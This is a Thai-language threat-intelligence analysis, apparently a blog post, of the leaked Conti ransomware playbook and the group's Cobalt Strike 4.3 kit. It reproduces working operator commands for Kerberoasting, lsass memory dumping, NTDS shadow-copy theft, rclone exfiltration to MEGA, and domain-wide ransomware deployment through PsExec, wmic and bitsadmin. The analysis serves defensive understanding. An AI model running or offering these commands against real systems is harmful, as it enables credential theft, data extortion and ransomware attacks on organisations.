ในส่วนของการค้นหาข้อมูลภายในระบบ ผู้ปฏิบัติการจะทำการค้นหาชื่อบัญชีผู้ใช้ปัจจุบัน, กลุ่มของผู้ใช้งาน, รายการบัญชีผู้ใช้งานที่มีสิทธิ์เป็นผู้ดูแลระบบ, รายการบัญชีผู้ใช้งานในกลุ่ม domain admins และ enterprise admins, ข้อมูลของระบบ domain controller และจำนวนระบบในโดเมน การเก็บข้อมูลเกิดขึ้นผ่าน Cobalt Strike โดยใช้คำสั่ง `net`

หลังจากนั้นผู้ปฏิบัติการจะทำการเก็บข้อมูลของการใช้ฟีเจอร์ File sharing ผลลัพธ์ในส่วนนี้จะได้รายการของไฟล์ที่สามารถเข้าถึงได้ผ่านฟีเจอร์ด้วย เป้าหมายในขั้นตอนนี้คือการหา `ADMIN$` และพาธในฟีเจอร์ File sharing ที่บัญชีผู้ใช้งานปัจจุบันสามารถเข้าถึงได้ การเก็บข้อมูลจะมีการใช้สคริปต์ [Invoke-ShareFinder.ps1](https://powersploit.readthedocs.io/en/stable/Recon/README/) ร่วมกับคำสั่ง `powershell-import`  และ `psinject` ของ Cobalt Strike

คำสั่ง `psinject` เป็นฟีเจอร์ของ Cobalt Strike ในการแทรก DLL ของ PowerShell แบบ unmanaged ไปไว้ในโปรเซสอื่นเพื่อให้สามารถเรียกใช้คำสั่ง PowerShell ในโปรเซสดังกล่าวได้ Conti ใช้ฟีเจอร์บ่อยครั้งเมื่อมีการใช้งานสคริปต์ PowerShell ในปฏิบัติการ ตัวอย่างการเรียกใช้ในกรณีของ Conti มีตามรายละเอียดด้านล่าง  ผู้ปฏิบัติการจะมองพาธของข้อมูลที่เกี่ยวข้องกับธุรกิจของเหยื่อเพื่อนำข้อมูลออกในขั้นตอนต่อไป

```
powershell-import /home/user/work/Invoke-ShareFinder.ps1
psinject 1234 x64 Invoke-ShareFinder -CheckAdmin -Verbose | Out-File -Encoding ascii C:\ProgramData\sh.txt
psinject 5209 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shda.txt
```

ต่อมาผู้ปฏิบัติการจะเริ่มทำการเก็บข้อมูลสำหรับใช้ในการยืนยันตัวตนเพื่อยกระดับสิทธิ์ แนวทางในขั้นตอนนี้มีหลากหลายตามรายการดังนี้

- ใช้เทคนิค Kerberoast กระบวนนี้มีทางเลือกของเครื่องมืออยู่ 2 แบบ คือการใช้สคริปต์ [Invoke-Kerberoast.ps1](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/) ผ่าน `powershell-import` และ `psinject` หรือการใช้ [Rubeus](https://github.com/GhostPack/Rubeus) ผ่านคำสั่ง `execute-assembly` จากนั้นนำค่าแฮชตามไฟล์ที่ระบุในพารามิเตอร์ `Out-File` หรือ `outfile` ออกมาเพื่อทำการแคร็กในภายหลัง

```
// Method 1
powershell-import /home/user/work/Invoke-Kerberoast.ps1
psinject 4728 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath C:\ProgramData\pshashes.txt -append -force -Encoding UTF8

// Method 2
execute-assembly /home/user/work/Rubeus.exe kerberoast /ldapfilter: 'admincount = 1' / format:hashcat /outfile:C:\ProgramData\hashes.txt
execute-assembly /home/user/work/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
```

- ใช้ mimikatz โดยใช้ฟังก์ชัน `sekurlsa::logonpasswords` และ `lsadump::sam` รวมไปถึง `lsadump::dcsync` เพื่อใช้เทคนิค DCSync
- ใช้เทคนิค DCSync ผ่านฟีเจอร์ของ Cobalt Strike
- สร้างไฟล์ minidump ของโปรเซส `lsass.exe` ด้วยโปรแกรม Task Manager เพื่อนำค้นหาข้อมูลสำหรับยืนยันตัวตนด้วย mimikatz ที่ระบบภายนอกต่อ
- ใช้ [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ในการสร้างไฟล์ memory dump ของโปรเซส `lsass.exe`
- เรียกใช้ฟังก์ชัน `MiniDump` ในไลบรารี `comsvcs.dll` เพื่อสร้างไฟล์ memory dump ของโปรเซส `lsass.exe`
- ใช้สคริปต์ [Net-GPPPassword](https://github.com/outflanknl/Net-GPPPassword) ในการหารหัสผ่านที่อาจมีอยู่ในไฟล์ Group Policy (สามารถเรียกใช้ได้ผ่าน `execute-assembly`)
- ใช้โปรแกรม RouterScan เพื่อ brute force ทางเครือข่าย
- ใช้ [Invoke-SMBAutoBrute.ps1](https://github.com/Shellntel/scripts/blob/master/Invoke-SMBAutoBrute.ps1) เพื่อ brute force ระบบเป้าหมายผ่านโปรโตคอล SMB

```
// Method 1: via rundll32
shell rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <PID> C:\ProgramData\lsass.dmp full

// Method 2: via wmic
shell wmic /node:<target> process call create "cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <PID> C:\ProgramData\lsass.dmp full"

// Method 3: via PsExec
remote-exec psexec <target> cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump <PID> C:\ProgramData\lsass.dmp full
```

- โจมตีช่องโหว่ในระบบที่ทำให้โดยมาซึ่งข้อมูลสำหรับใช้ยืนยันตัวตนหรือเงื่อนไข remote code execution ที่สามารถใช้เก็บข้อมูลสำหรับใช้ยืนยันตัวตนได้ต่อ ช่องโหว่ที่ถูกระบุมีดังนี้
    - ZeroLogon (CVE-2020-1472): มีตัวอย่างคำสั่งในการใช้ฟังก์ชัน `lsadump::zerologon` ใน mimikatz และ [ZeroLogon-BOF](https://github.com/rsmudge/ZeroLogon-BOF) ผ่าน Cobalt Strike ในการโจมตี
    - PrintNightmare (CVE-2021-34527): ใช้ `powershell-import` เพื่อเรียกฟังก์ชัน [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675) ในการโจมตี
    - MS17-010: ใช้ Metasploit Framework เพื่อโจมตีระบบที่มีช่องโหว่จากนั้นฝังตัวและเก็บข้อมูลสำหรับใช้ยืนยันตัวตนในระบบที่โจมตีได้
- ทำสำเนาไฟล์ NTDS ออกมา จุดน่าสนใจในส่วนนี้คือเทคนิคที่ใช้ในการสร้างสำเนาไฟล์ คู่มือของ Conti ระบุให้ใช้ฟีเจอร์ Volume Shadow Copies ในการสร้างสำเนาจากนั้นทำการคัดลอกสำเนาจากพาธของ Volume Shadow Copies ออกมา **เทคนิคนี้เป็นเทคนิคเดียวกันกับช่องโหว่ HiveNightmare หรือ SeriousSAM ซึ่งพึ่งถูกเปิดเผยเมื่อต้นเดือนสิงหาคม 2021**

```
// Step 1: Create a shadow copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C:\ 2>&1"

// Step 2: Copy the shadow copy out
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd / c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\

// Step 3: Compress for exfiltrating
7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
```

- ค้นหาข้อมูลสำรองและข้อมูลใน NAS โดยใช้โปรแกรม NetScan ที่มีอยู่ในชุดข้อมูล ManualsAndSoftware

จากนั้นผู้ปฏิบัติการจะทำการสร้างช่องทางลับในการเข้าถึงระบบภายหลัง ผู้ปฏิบัติการจะอาศัยซอฟต์แวร์ในกลุ่ม remote monitoring and management หรือ RMM อย่าง [AnyDesk](https://anydesk.com/en) หรือ [Atera](https://www.atera.com/) ซึ่งมักปรากฎอยู่ในองค์กรโดยทั่วไปอยู่แล้วในการจัดการการเข้าถึง สคริปต์สำหรับดาวโหลดและติดตั้ง AnyDesk ที่พบในชุดข้อมูล ManualsAndSoftware จะถูกใช้ในส่วนนี้

ในส่วนสุดท้ายของขั้นตอนที่ 1 คู่มือจะเน้นไปที่แนวทางของการระบุหาบัญชีของผู้ดูแลระบบทั้งในสภาพแวดล้อมที่เป็น Active Directory, เซิร์ฟเวอร์, NAS, ระบบสำรองข้อมูลใส่เทปรวมไปถึงระบบคลาวด์ซึ่งมักมีข้อมูลสำรองอยู่ แนวทางในส่วนการระบุหาบัญชีของผู้ดูแลระบบเกิดขึ้นทั้งการโดยใช้คำสั่ง `net` , โปรแกรม [SharpView](https://github.com/tevora-threat/SharpView) และใช้โปรแกรม AdFind พร้อมกับสคริปต์เพื่อช่วยเก็บข้อมูล

ข้อมูลในส่วนนี้มีค่อนข้างมากเนื่องจากคู่มือให้รายละเอียดในการทำความเข้าใจผลลัพธ์จากคำสั่งและโปรแกรมควบคู่ไปกับการทำความเข้าใจโครงสร้างขององค์กรเป้าหมาย รวมไปถึงการข้อมูลในเว็บเบราว์เซอร์, ไฟล์ประวัติการใช้งานโปรแกรมต่าง ๆ เช่น Putty, WinSCP, DBeaver และอื่น ๆ, ไฟล์ที่เกี่ยวข้องกับโปรแกรมในกลุ่ม password manager หรือไฟล์ที่อาจมีรหัสผ่านบันทึกอยู่ภายใน

### 4.1.2 Uploading Data

เมื่อเป้าหมายในขั้นตอนแรกเสร็จสิ้น ผู้ปฏิบัติการสามารถเข้าถึงบัญชีที่มีสิทธิ์สูงสุดในระบบขององค์กรเป้าหมายรวมไปถึงมีข้อมูลเกี่ยวกับแหล่งข้อมูลหลักและแหล่งข้อมูลสำรองขององค์กร ขั้นตอนต่อไปที่ผู้ปฏิบัติการจะดำเนินการคือการนำข้อมูลดังกล่าวออกไปยังระบบภายนอกเพื่อสร้างเงื่อนไขแรกในการเรียกค่าไถ่ ขั้นตอนของการส่งออกข้อมูลประกอบไปด้วยขั้นตอนย่อยดังต่อไปนี้

1. เปิดบัญชีบริการ [MEGA](https://mega.io) โดยเลือกแพ็คเกจการใช้งานเป็น Pro I ที่จะได้รับพื้นที่ในการเก็บข้อมูลทั้งหมด 2 เทระไบต์ ให้นำข้อมูลการจ่ายเงินจากหัวหน้าทีมไประบุและเก็บใบเสร็จการชำระค่าบริการเพื่อส่งคืนให้กับหัวหน้าทีม คู่มือยังกำชับไม่ให้มีการใช้บัญชี MEGA เดียวกันในหลายเป้าหมายหรือข้ามทีมด้วย
2. สร้างไฟล์การตั้งค่าสำหรับโปรแกรม [rclone](https://rclone.org/) เพื่อให้สามารถอัปโหลดข้อมูลไปยังบริการ MEGA ได้
3. เริ่มทำการอัปโหลดโดยใช้โปรแกรม rclone ตัวอย่างคำสั่งที่ใช้ในการอัปโหลดตามตัวอย่างด้านล่าง (มีการแนะนำให้อ่านคู่มือของ rclone เพื่อเรียนรู้พารามิเตอร์อื่น ๆ ที่อาจใช้เพื่อประสิทธิภาพในการอัปโหลดไฟล์)

```
shell rclone.exe copy "\\WTFINANCE.washoetribe.net\E$\FINANCE" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M
```

1. ในกรณีของการนำไฟล์ออกจากเซิร์ฟเวอร์แบบแยกเดี่ยว คู่มือมีการแนะนำให้ติดตั้งโปรแกรม MEGA Sync ของบริการ MEGA เพื่อทำการอัปโหลดข้อมูลเช่นเดียวกัน
2. สร้างชุดข้อมูลสำหรับการข่มขู่โดยเน้นไปที่การหาข้อมูลบัญชีหรือประวัติการทำธุรกรรมย้อนหลัง เน้นไปที่ข้อมูลที่มีคีย์เวิร์ด อาทิ cyber, policy, insurance, endorsement, supplementary, underwriting, terms, bank, 2020, 2021 และ Statement จากนั้นทำสำเนาข้อมูลเหล่านี้พร้อมรายการแยกออกมาจากข้อมูลที่มีอยู่ใน MEGA

### 4.1.3 Deploying Locker

ในส่วนสุดท้ายที่ปรากฎในชุดข้อมูล ผู้ปฏิบัติการจะได้รับคำสั่งให้เตรียมพร้อมเพื่อการติดตั้งและเริ่มการทำงานมัลแวร์เรียกค่าไถ่ ขั้นตอนในส่วนนี้จะเริ่มต้นโดยการใช้ระบบซึ่งทำหน้าที่เป็น domain controller เป็นจุดในการกระจายไฟล์โปรแกรมของมัลแวร์เรียกค่าไถ่ไปยังระบบที่อยู่ในโดเมนเดียวกัน ช่องทางของการแพร่กระจายไฟล์โปรแกรมนั้นเกิดขึ้นผ่านโปรโตคอล SMB และการใช้ฟีเจอร์ Background Intelligent Transfer Service (BITS) เข้ามาช่วย คู่มือระบุให้ทำการสร้างไฟล์สคริปต์เพื่อดำเนินการในขั้นตอนนี้โดยให้แยกตามลักษณะของโปรโตคอลหรือฟังก์ชันที่ใช้ ตามตัวอย่างด้านล่าง

```
// Copying ransomware payload across the entire domain
start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\PRIMARY_DOMAIN_CONTROLLER\share$\fx166.exe" "C:\windows\temp\ "

// Executing ransomware payload across the entire domain
start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe

// Copying and executing with WMI and Bitsadmin
start wmic /node:@C:\share$\comps1.txt /user:"DOMAIN \Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\DOMAIN_CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe & %APPDATA%\fx166.exe "
```

นอกเหนือจากการกระจายและเอ็กซีคิวต์โปรแกรมของมัลแวร์เรียกค่าไถ่ คู่มือยังระบุถึงการปิดการทำงานของโปรแกรมป้องกันมัลแวร์ในระบบด้วย (น่าจะบอกก่อนที่จะปล่อย)

สุดท้ายเมื่อโปรแกรมของมัลแวร์เรียกค่าไถ่ทำงานเสร็จสิ้น ผู้ปฏิบัติการจะต้องจัดเตรียมรายการปฏิบัติการตามตัวอย่างด้านล่าง

```
Example:
===============================================================
https://www.zoominfo.com/c/labranche-therrien-daoust-lefrancois/414493394
Website: ltdl.ca
1398 Servers 9654 Works - all in lock
Mega :
Ulfayjhdtyjeman@outlook.com
u4 naY [ pclwuhkpo5iW
25000 GB info

Labranche Therrien Daoust Lefrançois - financiers / accountants
Revenue: $ 985 Million
Locker: Conti
Case from botnet
--- BEGIN ID ---
i0KrUPg8RSrFuPPr16C931X2rS04c4892ZR1fNVfhmrmVXtOlxYisSzBJHvksbzI
================================================================
```

## 4.2 Additional Analysis - Cobalt Strike

หนึ่งในประเด็นน่าสนใจจากการวิเคราะห์ชุดข้อมูลของ Conti อยู่ในประเด็นของเครื่องมือที่ใช้ แม้ว่าเครื่องมือที่ใช้ในการโจมตีโดยส่วนใหญ่จะเป็นโปรแกรมหรือโครงการแบบโอเพนซอร์ส แต่การควบคุมและสั่งการระบบเป้าหมายของ Conti ก็พึ่งพาโปรแกรม Cobalt Strike ซึ่งไม่ใช่โปรแกรมฟรีเป็นหลัก ผู้ปฏิบัติการที่เกี่ยวข้องกับ Conti ยังได้รับการแจกชุดโปรแกรมเถื่อนของโปรแกรม Cobalt Strike เพื่อให้สามารถเข้าถึงระบบและเริ่มปฏิบัติการได้

คำถามในสถานการณ์นี้เกิดขึ้นทั้งในมุมของผู้วิเคราะห์อย่างผมเกี่ยวกับรายละเอียดของการตั้งค่าสำหรับโปรแกรม Cobalt Strike ที่อาจมีความพิเศษมากกว่าปกติที่อาจนำไปมาสู่การระบุหาเซิร์ฟเวอร์ที่ใช้ออกคำสั่งและควบคุมได้ รวมไปถึงประเด็นของการใช้งานปลั๊กอินหรือส่วนเสริมของโปรแกรม Cobalt Strike ในการช่วยสนับสนุนปฏิบัติการ ในอีกมุมหนึ่งจะเกิดขึ้นหากเราจำลองตัวเองเป็นผู้ปฏิบัติการเสียเองด้วยคำถามง่าย ๆ ว่าเป็นไปได้ไหมที่โปรแกรม Cobalt Strike จะถูกแก้ไขด้วยบางวิธีการให้เป็นประโยชน์ต่อกลุ่ม Conti ในภายหลังด้วย

การวิเคราะห์ในส่วนนี้จึงเกิดขึ้นเพื่อพยายามทำความเข้าใจและหาคำตอบในความเป็นไปได้เหล่านี้ครับ

Conti พึ่งพาการเอ็กซีคิวต์คำสั่งส่วนใหญ่ผ่านทาง Cobalt Strike พฤติกรรมนี้สอดคล้องไปกับข้อมูลที่พบในชุดคู่มือที่ถูกปล่อยออกมา โดยในชุดข้อมูลที่ปล่อยออกมานั้นมีชุดโปรแกรม Cobalt Strike รุ่น 4.3 อยู่ด้วย

หากเปรียบเทียบกับสำเนาเถื่อนของ Cobalt Strike 4.3 ที่มีการเผยแพร่อยู่ในอินเตอร์เน็ตนั้น สำเนา Cobalt Strike 4.3 ของ Conti มีข้อแตกต่างอยู่บางส่วน ดังนี้

- การมีอยู่ของไฟล์ `BaseArtifactUtils.class` และ `ListenerConfig.class` ซึ่งไม่มีในสำเนาเถื่อนแบบอื่น ไฟล์ `BaseArtifactUtils.class` เกี่ยวข้องการปรับแต่งและตั้งค่า payload ของ Cobalt Strike ส่วนไฟล์ `ListenerConfig.class` เกี่ยวกับการปรับแต่งการตั้งค่าของ listener
- การมีอยู่ของไฟล์ `cobaltstrike.store` ซึ่งแสดงให้เห็นว่าเคยมีการสร้าง certificate สำหรับ TeamServer มาก่อนแล้ว keystore ใช้รหัสผ่าน `sUp3r@dm1n` ซึ่งเป็นรหัสผ่านเดียวกันกับสำเนาเถื่อนของ Cobalt Strike 4.3 และมีรายการของ private key อยู่เพียงรายการเดียว

```
Keystore type: PKCS12
Keystore provider: SUN

Your keystore contains 1 entry

cobaltstrike, Nov 13, 2020, PrivateKeyEntry, 
Certificate fingerprint (SHA-256): E4:AC:A4:BC:16:D4:67:36:41:AE:6D:44:10:1E:2E:AB:09:A3:7B:6C:6B:79:FD:50:22:AD:1D:93:A2:76:15:F0
```

- การมีอยู่ของไฟล์ `cs.jar` ซึ่งถูกใช้เป็น client แทนไฟล์ `cobaltstrike.jar` ข้อแตกต่างในส่วนนี้ส่งผลต่อไฟล์ launcher สำหรับลินุกซ์`cobaltstrike` ในส่วนที่เป็นพารามิเตอร์ชื่อไฟล์ด้วย
- ข้อแตกต่างในไฟล์ `cobaltstrike.jar` ซึ่งเป็นไฟล์ client หลักของ Cobalt Strike ไฟล์ `cobaltstrike.jar` ในชุดโปรแกรมของ Conti มีข้อแตกต่างอยู่ในซอร์สโค้ดบางส่วนใน `BaseArtifactUtils.class` และ `ListenerConfig.class` ยังไม่สามารถระบุข้อแตกต่างอย่างเฉพาะเจาะจงได้
- พารามิเตอร์ที่แตกต่างกันในไฟล์ launcher อย่าง `start.sh`  และ `teamserver` ข้อมูลที่แตกต่างกันส่วนใหญ่ไม่ได้มีความแตกต่างกันอย่างมีนัยยะสำคัญเมื่อเทียบกับการรั่วไหลของสำเนาเถื่อนของ Cobalt Strike 4.3 หลาย ๆ ครั้ง

แม้จะมีความแตกต่างกับสำเนาเถื่อนที่ปรากฎในอินเตอร์เน็ต ชุดโปรแกรม Cobalt Strike ของ Conti ก็ยังไม่มีข้อแตกต่างที่บ่งชี้ให้เห็นถึงการฝังโค้ดที่เป็นอันตรายลงไปจากการตรวจสอบเบื้องต้น

# 5. References

- [Conti Unpacked: Understanding Ransomware Development as a Response to Detection - A Detailed Technical Analysis](https://assets.sentinelone.com/ransomware-enterprise/conti-ransomware-unpacked)
- [Conti Modus Operandi and Bitcoin Tracking](https://www.clearskysec.com/wp-content/uploads/2021/02/Conti-Ransomware.pdf)
- [Malpedia - Conti](https://malpedia.caad.fkie.fraunhofer.de/details/win.conti)